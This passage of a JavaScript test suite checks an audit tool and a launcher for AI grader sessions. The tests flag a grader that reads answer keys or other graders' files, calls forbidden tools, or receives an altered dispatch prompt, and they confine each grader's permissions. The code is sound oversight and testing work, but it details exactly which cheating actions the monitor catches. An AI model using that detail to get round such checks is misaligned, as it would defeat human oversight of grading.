        ['Edit another file\'s verdicts', tool('Edit', { file_path: `${B}/verdicts.blind-2.g1.json`, old_string: 'a', new_string: 'b' })],
        ['Read a key file', tool('Read', { file_path: `${B}/key.blind-1.json` })],
        ['Read an answer file', tool('Read', { file_path: 'C:/x/interview60.answers.gemini-3.5-flash-lite_fturn-s50m-A-r1.json' })],
        ['Read ../pairs.blind-1.json (resolves outside the blind folder)', tool('Read', { file_path: '../pairs.blind-1.json' })],
    ];
    for (const [name, t] of reads) { r = au(own([t])); check(`NEGATIVE CONTROL ${name}: FLAGGED`, flagged(r), show(r)); }
    for (const [name, t] of [['Grep', tool('Grep', { pattern: 'x', path: B })], ['Glob', tool('Glob', { pattern: '*' })], ['Agent', tool('Agent', { prompt: 'x' })], ['WebFetch', tool('WebFetch', { url: 'https://x' })], ['an mcp__ call', tool('mcp__plugin_claude-mem_mcp-search__search', { query: 'x' })]]) {
        r = au(own([t])); check(`${name} is FLAGGED (under the flag too)`, flagged(r), show(r));
    }
    r = au(own([tool('Edit', { file_path: `${B}/verdicts.blind-1.g1.json`, old_string: 'a', new_string: 'b' })])); check('Edit of the OWN verdicts file is clean under the flag', clean(r));
    r = au(own([tool('Edit', { file_path: `${B}/verdicts.blind-1.g1.json`, old_string: 'a', new_string: 'b' })]), { flag: false }); check('... and clean WITHOUT the flag too (point 15 reverses the old "Edit is flagged without the flag": Edit of the own verdicts counts as Write; an Edit of any other file stays FLAGGED, section F)', clean(r));
    r = au([...own(), assistant('claude-opus-5-5', [tool('Read', { file_path: `${B}\\pairs.blind-1.json` })])]); check('a backslash spelling of the own pairs path (C:\\x\\blind\\pairs.blind-1.json) is the same file: clean', clean(r));
    r = au(own([tool('Read', { file_path: 'pairs.blind-1.json' })])); check('a relative ./pairs.blind-1.json resolves against the blind folder: clean', clean(r));
    r = au(own(), { tag: 'blind-2.g1' }); check('the same calls under another tag (blind-2.g1) are FLAGGED: own is derived per tag', flagged(r), show(r));

    // ── transcripts that cannot be audited ──
    r = cli('audit-graders.mjs', ['--projects', path.join(tmp, 'projects'), 'blind-1.g1=ffffffffffffffff']); check('a transcript that cannot be found cannot be audited: exit 1', r.code === 1 && /NOT FOUND/.test(r.out));
    r = cli('audit-graders.mjs', ['--blind-dir', B, 'blind-1.g1=file:/c/x/y.jsonl']); check('file:/c/... (Git-Bash form) is refused, C:/ paths only: exit 2', r.code === 2);
    r = cli('audit-graders.mjs', [...baseArgs, '--session', SESSION, `blind-1.g1=${PROBE}`]); check(`the real alias probe ${PROBE} (no tool use at all) is clean`, r.code === 0 && /0 tool inputs/.test(r.out));

    // ── the dispatch check (A2 M1): the first user message must be h40d's dispatch text with only the paths and the tag substituted ──
    const DISPATCH = path.join(SPDIR, 'validation-hour/h40d-grader-dispatch.txt');
    const template = fs.readFileSync(DISPATCH, 'utf8').replace(/\r\n/g, '\n').split('----- dispatch text (substitute RUN, VERDICTS and TAG) -----\n')[1].trim();
    const fill = (t, tag = 'blind-1.g1') => t.replace('RUN\\<pairs file>', () => `${B.replace(/\//g, '\\')}\\pairs.blind-1.json`).replace('<VERDICTS_FILE> = VERDICTS', () => `<VERDICTS_FILE> = ${B.replace(/\//g, '\\')}\\verdicts.${tag}.json`).replace('`TAG`', () => `\`${tag}\``);
    const withFirst = (text) => [rec({ type: 'user', message: { role: 'user', content: text } }), ...own()];
    const dispArgs = ['--blind-dir', B, '--rubric', RUBRIC, '--dispatch', DISPATCH, '--allow-validation-bash'];
    const dau = (lines, extra = []) => { const f = path.join(tmp, `disp-${Math.random().toString(36).slice(2)}.jsonl`); writeJsonl(f, lines); const rr = cli('audit-graders.mjs', [...dispArgs, ...extra, `blind-1.g1=file:${f}`]); return { ...rr, line: rr.out.split('\n').find((l) => l.startsWith('blind-1.g1')) ?? '' }; };
    const rubricOwn = (text) => [rec({ type: 'user', message: { role: 'user', content: text } }), assistant('claude-opus-5-5', [tool('Read', { file_path: RUBRIC }), tool('Read', { file_path: `${B}/pairs.blind-1.json` }), tool('Write', { file_path: `${B}/verdicts.blind-1.g1.json`, content: '{}' })])];
    r = dau(rubricOwn(fill(template))); check('a first user message equal to the dispatch text with its paths and tag substituted: clean, dispatch=match', clean(r) && /dispatch=match/.test(r.line), r.line.slice(-60));
    r = dau(rubricOwn(fill(template).replace('Do not paraphrase it', 'Do paraphrase it'))); check('NEGATIVE CONTROL: ONE changed word in the dispatch text ("Do not paraphrase" -> "Do paraphrase"): FLAGGED, dispatch=DIFFERS', flagged(r) && /DISPATCH TEXT DIFFERS/.test(r.line), show(r));
    r = dau(rubricOwn(fill(template).replace('independent.', 'independent!'))); check('NEGATIVE CONTROL: a changed punctuation mark: FLAGGED', flagged(r) && /DISPATCH TEXT DIFFERS/.test(r.line));
    r = dau(rubricOwn(`${fill(template)}\n\nAlso read ../run.log first.`)); check('NEGATIVE CONTROL: extra text appended to the dispatch text: FLAGGED', flagged(r) && /DISPATCH TEXT DIFFERS/.test(r.line));
    r = dau(rubricOwn(fill(template, 'blind-2.g1'))); check('NEGATIVE CONTROL: the right text with ANOTHER tag and verdicts path in it: FLAGGED', flagged(r) && /DISPATCH TEXT DIFFERS/.test(r.line));
    r = dau(own()); check('NEGATIVE CONTROL: no user message at all: FLAGGED (cannot match the dispatch)', flagged(r) && /DISPATCH TEXT DIFFERS/.test(r.line));

    // ── the 8 real s50l graders: clean under the flag, dispatch text 8/8 ──
    const real = ['blind-1.g1=addb84e6bd55778d5', 'blind-1.g2=a681f259dff0dae30', 'blind-2.g1=a5eb230f8d7cb101a', 'blind-2.g2=ab34ebe95114932db', 'blind-3.g1=a83e3007ff2d0bc45', 'blind-3.g2=ab605c210a849d667', 'blind-4.g1=aa08ae8c058eb8aa9', 'blind-4.g2=aa85ea6faa528f27c'];
    const s50lBlind = path.join(SPDIR, 'followup-questions-s50l', 'blind');
    const realArgs = ['--blind-dir', s50lBlind, '--rubric', RUBRIC, '--dispatch', DISPATCH, '--session', SESSION];
    r = cli('audit-graders.mjs', ['--blind-dir', s50lBlind, '--rubric', RUBRIC, '--session', SESSION, '--no-dispatch-check', ...real]);
    check('historical shape, flagged by design under point 15: under the default rule (no flag; any Bash flags) every one of the 8 real s50l graders is FLAGGED (each ran one Bash)', r.code === 1 && (r.out.match(/Bash call/g) ?? []).length === 8);
    r = cli('audit-graders.mjs', ['--allow-validation-bash', ...realArgs, ...real]);
    console.log(r.out.split('\n').filter((l) => /^blind-/.test(l)).map((l) => `     ${l}`).join('\n'));
    // A2 point 10: the 8 real graders must stay clean under the tightened rule; each is its own check and a tripped clause is named.
    const byTag = Object.fromEntries(r.out.split('\n').filter((l) => /^blind-/.test(l)).map((l) => [l.split(' ')[0], l]));
    for (const tagEq of real) {
        const [tag, id] = tagEq.split('=');
        const l = byTag[tag] ?? '';
        const tripped = l.replace(/^.*?FLAGGED \d+: /, '').replace(/; bash=.*$/, '');
        check(`REAL ${tag} (${id}) reads CLEAN under the tightened rule (Read rubric + own pairs, Write own verdicts, one validation Bash)`, / clean;/.test(l) && !/FLAGGED/.test(l), / clean;/.test(l) ? '' : (tripped.match(/point 10 [^:]*: [^:]*|not of the shape[^:]*|string literal [^:]*/)?.[0] ?? tripped).slice(0, 130));
    }
    check('... the 8 real first user messages match the dispatch text (8/8)', (r.out.match(/dispatch=match/g) ?? []).length === 8 && !/DIFFERS/.test(r.out));
    check('... each real Bash is recorded as <length>:<sha12> (allowed ones in bash=[...], tripped ones in the flag text)', (r.out.match(/bash=\[\d+:[0-9a-f]{12}\]/g) ?? []).length + (r.out.match(/Bash\[len=\d+,sha12=[0-9a-f]{12}\]/g) ?? []).length >= 8);
    // the very same real transcripts judged against another blind folder / the other grader's tag are FLAGGED (the allowlist is per slot)
    r = cli('audit-graders.mjs', ['--allow-validation-bash', ...realArgs, 'blind-1.g2=addb84e6bd55778d5']); check('the real blind-1.g1 transcript audited AS blind-1.g2 is FLAGGED (it wrote the other grader\'s files)', r.code === 1 && /FLAGGED/.test(r.out));
}
// ───────────────────────── D. launch-grader.mjs (addendum G1 + G3): everything except the real model call ─────────────────────────
if (want('D')) {
    console.log('\n=== D. launch-grader.mjs: fresh cwd per attempt, memory pre-check, permissions, at most 2 at once (a stand-in for the claude binary; NO model call) ===');
    const FT = path.dirname(R);
    // F\grading is the controller's: it holds the real probes / pilot once they have flown (23:29-23:31), so "not touched" is a before/after comparison, not absence
    const gradingSnap = () => { const g = path.join(FT, 'grading'); try { return JSON.stringify(fs.readdirSync(g).sort().map((n) => [n, fs.statSync(path.join(g, n)).mtimeMs])); } catch { return 'absent'; } };
    const gradingBefore = gradingSnap();
    // the cwd of the 22:19 probe, as a literal: the ground truth for the slug formula (a proof copy of this folder has another FT, so FT must not be used here)
    const REAL_GRADING = 'C:\\Users\\sotka\\AppData\\Local\\Temp\\claude\\C--Users-sotka-OneDrive-Masa-st--natively-cluely-ai-assistant--claude-worktrees-nifty-lederberg-49681a\\9c5886c7-cdbd-48af-b8bc-e9275012ec64\\scratchpad\\followup-turn\\grading';
    const LG = await import(new URL(`file:///${path.join(R, 'launch-grader.mjs').replace(/\\/g, '/')}`).href);
    const AG = await import(new URL(`file:///${path.join(R, 'audit-graders.mjs').replace(/\\/g, '/')}`).href);
    // helpers
    check('projectSlug reproduces the REAL project folder name of F\\grading (200 characters + "-" + the base-36 hash: ...-followup-7potx7)', fs.existsSync(path.join(PROJECTS, LG.projectSlug(REAL_GRADING))) && LG.projectSlug(REAL_GRADING).endsWith('-7potx7'));
    check('... a short cwd keeps its full slug (non-alphanumerics -> "-")', LG.projectSlug('C:\\a\\b c') === 'C--a-b-c');
    check('absRule: C:\\Users\\x\\y.json -> Read(//c/Users/x/y.json) (Windows paths are normalized to /c/... in permission rules)', LG.absRule('Read', 'C:\\Users\\x\\y.json') === 'Read(//c/Users/x/y.json)' && LG.absRule('Edit', 'D:/q/r') === 'Edit(//d/q/r)');
    const proj = path.join(tmp, 'projects-D');
    const cwdA = path.join(tmp, 'cwdA');
    fs.mkdirSync(path.join(proj, LG.projectSlug(cwdA), 'memory'), { recursive: true });
    check('memoryEntries: an EMPTY memory\\ folder (as the real 22:19 probe left) reads [] ...', LG.memoryEntries(cwdA, proj).length === 0 && LG.memoryEntries(path.join(tmp, 'never-existed'), proj).length === 0);
    fs.writeFileSync(path.join(proj, LG.projectSlug(cwdA), 'memory', 'note.md'), 'x');
    check('... and a memory\\ folder holding one file reads one entry (the pre-launch refusal)', LG.memoryEntries(cwdA, proj).length === 1);
    const template = AG.dispatchTemplate(AG.DISPATCH_FILE);
    const bdir = 'C:/x/blind';
    const prompt = LG.buildPrompt(template, { blindDir: bdir, slot: 'blind-3.g1' });
    check('buildPrompt: the registered dispatch text with ONLY the pairs path, the verdicts path and the tag substituted passes the audit\'s own dispatch check', AG.dispatchProblem(prompt, template, { blindDir: bdir, files: AG.ownFiles('blind-3.g1'), tag: 'blind-3.g1' }) === null && prompt.includes('pairs.blind-3.json') && prompt.includes('verdicts.blind-3.g1.json') && prompt.includes('`blind-3.g1`'));
    check('... and the same prompt audited as another slot does not', AG.dispatchProblem(prompt, template, { blindDir: bdir, files: AG.ownFiles('blind-4.g1'), tag: 'blind-4.g1' }) !== null);
    const { args, rules } = LG.claudeArgs({ prompt, blindDir: bdir, slot: 'blind-3.g1' });
    check('claude argv (point 15): -p <prompt> --model opus --output-format json, dontAsk, tools EXACTLY Read,Write,Edit (no Bash), strict MCP, NO --add-dir, no --dangerously-skip-permissions', args[0] === '-p' && args[1] === prompt && args.includes('opus') && args[args.indexOf('--output-format') + 1] === 'json' && args[args.indexOf('--permission-mode') + 1] === 'dontAsk' && args[args.indexOf('--tools') + 1] === 'Read,Write,Edit' && !args.some((a) => /Bash/.test(a)) && !args.includes('--add-dir') && args.includes('--strict-mcp-config') && !args.some((a) => /dangerously/.test(a)));
    check('permission rules (point 15): Read own pairs + the grader-instruction file, Edit own verdicts; no Bash rule; nothing for another file', rules.length === 3 && rules[0] === 'Read(//c/x/blind/pairs.blind-3.json)' && /^Read\(\/\/c\/Users\/sotka\/OneDrive\/Masaüstü\/.*interview60\.grader-prompt\.md\)$/.test(rules[1]) && rules[2] === 'Edit(//c/x/blind/verdicts.blind-3.g1.json)' && args.slice(args.indexOf('--allowed-tools') + 1).join() === rules.join());
    const pa = LG.probeArgs({ prompt: 'p', inFile: 'C:/g/probe-input.txt', outFile: 'C:/g/c-a1/out.txt' });
    check('probeArgs (point 15): the same flags as a grader (dontAsk, tools Read,Write,Edit, strict MCP, no --add-dir), rules = Read the input, Edit the out file, no Bash', pa.rules.length === 2 && pa.rules[0] === 'Read(//c/g/probe-input.txt)' && pa.rules[1] === 'Edit(//c/g/c-a1/out.txt)' && pa.args.slice(0, 2).join() === '-p,p' && pa.args.includes('dontAsk') && pa.args[pa.args.indexOf('--tools') + 1] === 'Read,Write,Edit' && !pa.args.some((a) => /Bash/.test(a)) && !pa.args.includes('--add-dir') && JSON.stringify(pa.args.slice(0, pa.args.indexOf('--allowed-tools'))) === JSON.stringify(LG.claudeArgs({ prompt: 'p', blindDir: bdir, slot: 'blind-3.g1' }).args.slice(0, pa.args.indexOf('--allowed-tools'))));
    const sd = path.join(tmp, 'sf'); const cwdS = path.join(tmp, 'cwdS'); const slugS = path.join(sd, LG.projectSlug(cwdS)); fs.mkdirSync(slugS, { recursive: true });
    fs.writeFileSync(path.join(slugS, 'sess1.jsonl'), '{}\n');
    check('slugFacts: the attempt\'s own slug folder holding exactly its one .jsonl and no memory\\ -> slugJsonl 1, memoryDir absent', JSON.stringify(LG.slugFacts(cwdS, 'sess1', path.join(slugS, 'sess1.jsonl'))) === JSON.stringify({ slugJsonl: 1, memoryDir: 'absent' }));
    fs.writeFileSync(path.join(slugS, 'other.jsonl'), '{}\n'); fs.mkdirSync(path.join(slugS, 'memory'));
    check('... a second .jsonl -> slugJsonl 2; an empty memory\\ -> empty', JSON.stringify(LG.slugFacts(cwdS, 'sess1', path.join(slugS, 'sess1.jsonl'))) === JSON.stringify({ slugJsonl: 2, memoryDir: 'empty' }));
    fs.writeFileSync(path.join(slugS, 'memory', 'n.md'), 'x');
    check('... a non-empty memory\\ -> non-empty; a transcript in ANOTHER cwd\'s slug folder -> slugJsonl 0; no transcript -> 0 / unknown', LG.slugFacts(cwdS, 'sess1', path.join(slugS, 'sess1.jsonl')).memoryDir === 'non-empty' && LG.slugFacts(path.join(tmp, 'elsewhere'), 'sess1', path.join(slugS, 'sess1.jsonl')).slugJsonl === 0 && JSON.stringify(LG.slugFacts(cwdS, 'x', null)) === JSON.stringify({ slugJsonl: 0, memoryDir: 'unknown' }));
    check('slugJsonls: lists the top-level .jsonl of the EXACT folder only (a sibling cwd sharing the 200-char prefix is not matched)', LG.slugJsonls(cwdS, sd).length === 2 && LG.slugJsonls(cwdS + '-a2', sd).length === 0);
    // at most 2 graders at once
    const base = path.join(tmp, 'slots'); fs.mkdirSync(base);
    const r1 = LG.acquireSlot('a', base), r2 = LG.acquireSlot('b', base), r3 = LG.acquireSlot('c', base);
    check('at most 2 graders at once: slots 1 and 2 are granted, the third launcher is refused', !!r1 && !!r2 && r3 === null);
    r1(); const r4 = LG.acquireSlot('d', base);
    check('... a released slot is granted again; a dead launcher\'s slot (stale pid) is reclaimed', !!r4 && (() => { fs.writeFileSync(path.join(base, '.slots', 'slot-2', 'pid'), '999999'); const x = LG.acquireSlot('e', base); return !!x && fs.readFileSync(path.join(base, '.slots', 'slot-2', 'label'), 'utf8') === 'e'; })());
    fs.rmSync(base, { recursive: true, force: true });

    // the CLI against a stand-in for the claude binary (TURN_FAKE_CLAUDE): it records its argv, writes the verdicts file named in the prompt (all the pairs' keys) and
    // a transcript in the EXACT slug folder Claude Code would use for its cwd (the launcher's own projectSlug, which section D's first check ties to the real folder)
    const fakeDir = path.join(tmp, 'fake'); fs.mkdirSync(fakeDir, { recursive: true });
    const fake = path.join(fakeDir, 'fake-claude.mjs');
    fs.writeFileSync(fake, `import fs from 'node:fs'; import path from 'node:path'; import crypto from 'node:crypto';
const { projectSlug } = await import(process.env.FAKE_LG);
const a = process.argv.slice(2); const dir = process.env.FAKE_DIR; const sid = crypto.randomUUID();
fs.appendFileSync(path.join(dir, 'calls.jsonl'), JSON.stringify({ args: a, cwd: process.cwd() }) + '\\n');
const prompt = a[1]; const v = /<VERDICTS_FILE> = (.+)/.exec(prompt); const o = /into the file (\\S+)/.exec(prompt);
if (v && !process.env.FAKE_NO_WRITE) {
    const vf = v[1].trim(); const items = JSON.parse(fs.readFileSync(path.join(path.dirname(vf), 'pairs.blind-1.json'), 'utf8')).items;
    const keep = process.env.FAKE_PARTIAL ? items.slice(0, 1) : items;
    fs.writeFileSync(vf, JSON.stringify(Object.fromEntries(keep.map((i) => [i.key, { correctness: 2, on_topic: 2, delivery: 2 }]))));
}
if (o) fs.writeFileSync(o[1].replace(/[.]$/, ''), '3');
const slugDir = path.join(process.env.TURN_PROJECTS, projectSlug(process.cwd())); fs.mkdirSync(slugDir, { recursive: true });
const use = [{ type: 'tool_use', name: 'Read', input: {} }, ...(o || v ? [{ type: 'tool_use', name: 'Write', input: {} }] : [])];
const lines = [{ type: 'user', message: { role: 'user', content: process.env.FAKE_MEMORY ? '# Memory Index' : 'hi' } }, { type: 'assistant', message: { role: 'assistant', model: 'claude-opus-5-5', content: use } }];
fs.writeFileSync(path.join(slugDir, sid + '.jsonl'), lines.map((l) => JSON.stringify(l)).join('\\n') + '\\n');
if (process.env.FAKE_SECOND_JSONL) fs.writeFileSync(path.join(slugDir, crypto.randomUUID() + '.jsonl'), '{}\\n');
if (process.env.FAKE_MEMDIR) { fs.mkdirSync(path.join(slugDir, 'memory')); fs.writeFileSync(path.join(slugDir, 'memory', 'note.md'), 'x'); }
process.stdout.write(JSON.stringify({ type: 'result', subtype: 'success', is_error: !!process.env.FAKE_IS_ERROR, session_id: sid, modelUsage: { 'claude-opus-5-5': {} }, result: 'DONE' }));
process.exit(process.env.FAKE_EXIT ? Number(process.env.FAKE_EXIT) : 0);
`);
    const gdir = path.join(tmp, 'grading-D'), pdir = path.join(tmp, 'pilot-D'), projD = path.join(tmp, 'projects-fake'), outD = path.join(tmp, 'R-D');
    fs.mkdirSync(projD, { recursive: true });
    const lenv = (extra = {}) => ({ ...process.env, FQ_OUT_DIR: outD, TURN_GRADING_DIR: gdir, TURN_PROJECTS: projD, TURN_FAKE_CLAUDE: fake, FAKE_DIR: fakeDir, FAKE_LG: new URL(`file:///${path.join(R, 'launch-grader.mjs').replace(/\\/g, '/')}`).href, ...extra });
    const lg = (a, extra) => { const x = spawnSync(process.execPath, [path.join(R, 'launch-grader.mjs'), ...a], { encoding: 'utf8', env: lenv(extra) }); return { code: x.status, out: `${x.stdout}${x.stderr}` }; };
    const winDir = (p) => p.replace(/\\/g, '/');
    const jl = (f) => (fs.existsSync(f) ? fs.readFileSync(f, 'utf8').trim().split('\n').map((l) => JSON.parse(l)) : []);
    const calls = () => jl(path.join(fakeDir, 'calls.jsonl'));
    const rec = () => jl(path.join(pdir, 'launches.jsonl'));
    const FIELDS = ['attempt', 'cwd', 'endedAt', 'exit', 'memoryDir', 'model', 'session_id', 'slot', 'slugJsonl', 'startedAt'];
    let x = lg(['--make-pilot', winDir(pdir)]);
    check('--make-pilot writes a synthetic pairs.blind-1.json (4 items) and nothing else', x.code === 0 && fs.existsSync(path.join(pdir, 'pairs.blind-1.json')) && JSON.parse(fs.readFileSync(path.join(pdir, 'pairs.blind-1.json'), 'utf8')).items.length === 4 && fs.readdirSync(pdir).length === 1);
    check('... and refuses to overwrite it', lg(['--make-pilot', winDir(pdir)]).code === 2);
    x = lg(['pilot', '--pilot', winDir(pdir), '--dry-run']);
    check('--dry-run: prints cwd pilot-a1, the argv (prompt as length + sha12) and the rules; creates no cwd, calls nothing', x.code === 0 && /DRY RUN pilot attempt 1: cwd .*pilot-a1 \(fresh\)/.test(x.out) && /<prompt \d+ chars sha12 [0-9a-f]{12}>/.test(x.out) && /--allowed-tools/.test(x.out) && !fs.existsSync(gdir) && !fs.existsSync(path.join(fakeDir, 'calls.jsonl')));
    x = lg(['blind-1.g1', '--pilot', winDir(pdir)]);
    check('the slot `pilot` goes with --pilot: blind-1.g1 --pilot and pilot without --pilot are usage errors (exit 2), nothing created', x.code === 2 && lg(['pilot']).code === 2 && !fs.existsSync(gdir));
    x = lg(['pilot', '--pilot', winDir(pdir)]);
    check('a pilot launch: exit 0, ids printed (session, model, cwd pilot-a1, slugJsonl 1, memoryDir absent, memory ABSENT, tools, verdicts valid on the pairs)', x.code === 0 && /pilot a1: session [0-9a-f-]{36} model claude-opus-5-5 exit 0 cwd pilot-a1 slugJsonl 1 memoryDir absent memory ABSENT projectMemory=0 claudeMem=0 tools \{"Read":1,"Write":1\} verdicts file valid on its pairs \(4 keys\)/.test(x.out), x.out.slice(-200));
    check('... ONE line in <pilot dir>/launches.jsonl with exactly the ten fields of point 11(d), slot pilot, attempt 1, exit 0, slugJsonl 1', rec().length === 1 && JSON.stringify(Object.keys(rec()[0]).sort()) === JSON.stringify(FIELDS) && rec()[0].slot === 'pilot' && rec()[0].attempt === 1 && rec()[0].exit === 0 && rec()[0].slugJsonl === 1 && rec()[0].memoryDir === 'absent' && /^\d{4}-\d\d-\d\dT/.test(rec()[0].startedAt) && rec()[0].endedAt >= rec()[0].startedAt);
    check('... the cwd is a fresh, EMPTY folder grading\\pilot-a1 and claude ran INSIDE it; the line carries that cwd', fs.existsSync(path.join(gdir, 'pilot-a1')) && fs.readdirSync(path.join(gdir, 'pilot-a1')).length === 0 && calls().length === 1 && path.resolve(calls()[0].cwd) === path.resolve(path.join(gdir, 'pilot-a1')) && path.resolve(rec()[0].cwd) === path.resolve(path.join(gdir, 'pilot-a1')));
    check('... the prompt it was given passes the audit\'s dispatch check as blind-1.g1 (dispatch text, only paths and tag substituted)', AG.dispatchProblem(calls()[0].args[1], template, { blindDir: winDir(pdir), files: AG.ownFiles('blind-1.g1'), tag: 'blind-1.g1' }) === null);
    check('... argv (point 15): -p <prompt> --model opus --output-format json --permission-mode dontAsk --tools Read,Write,Edit --strict-mcp-config --allowed-tools <3 rules>; NO Bash anywhere, NO --add-dir, no --dangerously-skip-permissions', (() => { const a = calls()[0].args; return a[0] === '-p' && a[2] === '--model' && a[3] === 'opus' && a[a.indexOf('--output-format') + 1] === 'json' && a[a.indexOf('--permission-mode') + 1] === 'dontAsk' && a[a.indexOf('--tools') + 1] === 'Read,Write,Edit' && a.includes('--strict-mcp-config') && !a.includes('--add-dir') && !a.slice(2).some((q) => /Bash/.test(q)); })() && !calls()[0].args.some((a) => /dangerously/.test(a)) && calls()[0].args.slice(calls()[0].args.indexOf('--allowed-tools') + 1).length === 3);
    x = lg(['pilot', '--pilot', winDir(pdir)]);
    check('a second launch is refused while the slot\'s verdicts exist (move the earlier attempt away before a re-grade): exit 2, no call', x.code === 2 && calls().length === 1);
    fs.renameSync(path.join(pdir, 'verdicts.blind-1.g1.json'), path.join(pdir, 'verdicts.blind-1.g1.attempt1.json'));
    x = lg(['pilot', '--pilot', winDir(pdir)]);
    check('... with the verdicts moved away the SAME attempt number still cannot reuse its cwd: REFUSED, exit 2, no call', x.code === 2 && /already exists/.test(x.out) && calls().length === 1);
    x = lg(['pilot', '--pilot', winDir(pdir), '--attempt', '2']);
    check('--attempt 2 gets its own fresh cwd pilot-a2 and a second line; the first attempt\'s slug folder (a .jsonl) does NOT block it', x.code === 0 && fs.existsSync(path.join(gdir, 'pilot-a2')) && rec().length === 2 && rec()[1].attempt === 2 && rec()[1].slugJsonl === 1 && calls().length === 2);
    fs.renameSync(path.join(pdir, 'verdicts.blind-1.g1.json'), path.join(pdir, 'verdicts.blind-1.g1.attempt2.json'));
    const slugOf = (n) => path.join(projD, LG.projectSlug(path.join(gdir, `pilot-a${n}`)));
    fs.mkdirSync(path.join(slugOf(3), 'memory'), { recursive: true }); fs.writeFileSync(path.join(slugOf(3), 'memory', 'note.md'), 'x');
    x = lg(['pilot', '--pilot', winDir(pdir), '--attempt', '3']);
    check('point 9: a non-empty memory\\ in the attempt\'s EXACT projects folder -> REFUSED before the launch (exit 2, claude not called, no cwd created)', x.code === 2 && /non-empty memory/.test(x.out) && calls().length === 2 && !fs.existsSync(path.join(gdir, 'pilot-a3')));
    fs.mkdirSync(slugOf(4), { recursive: true }); fs.writeFileSync(path.join(slugOf(4), 'stale.jsonl'), '{}\n');
    x = lg(['pilot', '--pilot', winDir(pdir), '--attempt', '4']);
    check('point 9: a .jsonl already in the attempt\'s EXACT projects folder -> REFUSED (exit 2, claude not called)', x.code === 2 && /already holds 1 \.jsonl/.test(x.out) && calls().length === 2);
    fs.mkdirSync(path.join(slugOf(5), 'memory'), { recursive: true });
    x = lg(['pilot', '--pilot', winDir(pdir), '--attempt', '5']);
    check('... an EMPTY memory\\ folder (as the real 22:19 probe left) does not block the launch; the line reads memoryDir empty', x.code === 0 && rec()[2]?.attempt === 5 && rec()[2].memoryDir === 'empty' && rec()[2].slugJsonl === 1, x.out.slice(-160));
    fs.renameSync(path.join(pdir, 'verdicts.blind-1.g1.json'), path.join(pdir, 'verdicts.blind-1.g1.attempt5.json'));
    x = lg(['blind-2.g1', '--rerun']);
    check('a slot whose pairs file does not exist is a usage error (exit 2), nothing created', x.code === 2 && !fs.existsSync(path.join(gdir, 'blind-2.g1-a1')));
    const go = (extra, attemptN) => { fs.rmSync(path.join(pdir, 'verdicts.blind-1.g1.json'), { force: true }); return lg(['pilot', '--pilot', winDir(pdir), '--attempt', String(attemptN)], extra); };
    x = go({ FAKE_NO_WRITE: '1' }, 6);
    check('a grader that exits 0 but wrote no verdicts file: the line says MISSING/INVALID and the exit code is 1', x.code === 1 && /verdicts file MISSING\/INVALID/.test(x.out));
    x = go({ FAKE_PARTIAL: '1' }, 7);
    check('a grader that wrote 1 of the 4 keys: MISSING/INVALID naming the missing verdict, exit 1 (the registered replace-ONCE case)', x.code === 1 && /MISSING\/INVALID \(no valid verdict for/.test(x.out));
    x = go({ FAKE_SECOND_JSONL: '1' }, 8);
    check('a second .jsonl in the attempt\'s slug folder: the line reads slugJsonl 2 and the exit code is 1', x.code === 1 && rec().at(-1).attempt === 8 && rec().at(-1).slugJsonl === 2);
    x = go({ FAKE_MEMDIR: '1' }, 9);
    check('a non-empty memory\\ left behind by the attempt: memoryDir non-empty, exit 1', x.code === 1 && rec().at(-1).memoryDir === 'non-empty');
    x = go({ FAKE_EXIT: '1' }, 10);
    check('claude exiting 1: the line records exit 1', rec().at(-1).attempt === 10 && rec().at(-1).exit === 1 && x.code === 1);
    x = go({ FAKE_IS_ERROR: '1' }, 11);
    check('claude exiting 0 with is_error true is never recorded as exit 0', rec().at(-1).attempt === 11 && rec().at(-1).exit === 1 && x.code === 1);
    // a real slot: R/blind/launches.jsonl under the OUT dir; --rerun -> blind-rerun
    fs.mkdirSync(path.join(outD, 'blind'), { recursive: true }); fs.mkdirSync(path.join(outD, 'blind-rerun'), { recursive: true });
    fs.copyFileSync(path.join(pdir, 'pairs.blind-1.json'), path.join(outD, 'blind', 'pairs.blind-1.json')); fs.copyFileSync(path.join(pdir, 'pairs.blind-1.json'), path.join(outD, 'blind-rerun', 'pairs.blind-1.json'));
    x = lg(['blind-1.g1']);
    check('a real slot: the cwd is grading\\blind-1.g1-a1, the line goes to <R>/blind/launches.jsonl (slot blind-1.g1)', x.code === 0 && jl(path.join(outD, 'blind', 'launches.jsonl')).length === 1 && jl(path.join(outD, 'blind', 'launches.jsonl'))[0].slot === 'blind-1.g1' && fs.existsSync(path.join(gdir, 'blind-1.g1-a1')), x.out.slice(-160));
    x = lg(['blind-1.g1', '--rerun']);
    check('... --rerun uses <R>/blind-rerun (its own launches.jsonl, the same cwd name is a NEW attempt only with --attempt 2: here a1 exists -> REFUSED)', x.code === 2 && /already exists/.test(x.out));
    x = lg(['blind-1.g1', '--rerun', '--attempt', '2']);
    check('... --rerun --attempt 2 writes <R>/blind-rerun/launches.jsonl', x.code === 0 && jl(path.join(outD, 'blind-rerun', 'launches.jsonl')).length === 1 && jl(path.join(outD, 'blind-rerun', 'launches.jsonl'))[0].attempt === 2);
    // the G1 calibration probes
    const pl = path.join(outD, 'grader-cwd.launches.jsonl'), po = path.join(outD, 'grader-cwd.probes.out.txt');
    x = lg(['cwdprobe-2', '--probe']);
    check('probe 2 BEFORE probe 1: REFUSED (exit 2), nothing launched, no cwd', x.code === 2 && /REFUSED -- the second probe starts only after/.test(x.out) && !fs.existsSync(path.join(gdir, 'cwdprobe-2-a1')) && !fs.existsSync(pl));
    x = lg(['cwdprobe-1']);
    check('cwdprobe-1 without --probe (and --probe without a probe slot) are usage errors', x.code === 2 && lg(['--probe']).code === 2);
    x = lg(['cwdprobe-1', '--probe', '--dry-run']);
    check('probe --dry-run: prints the argv with the probe prompt and the rules, creates nothing, appends nothing', x.code === 0 && /DRY RUN cwdprobe-1: cwd .*cwdprobe-1-a1 \(fresh\)/.test(x.out) && !fs.existsSync(path.join(gdir, 'cwdprobe-1-a1')) && !/--dry-run/.test(fs.readFileSync(po, 'utf8')) && !fs.existsSync(path.join(gdir, 'probe-input.txt')));
    x = lg(['cwdprobe-1', '--probe']);
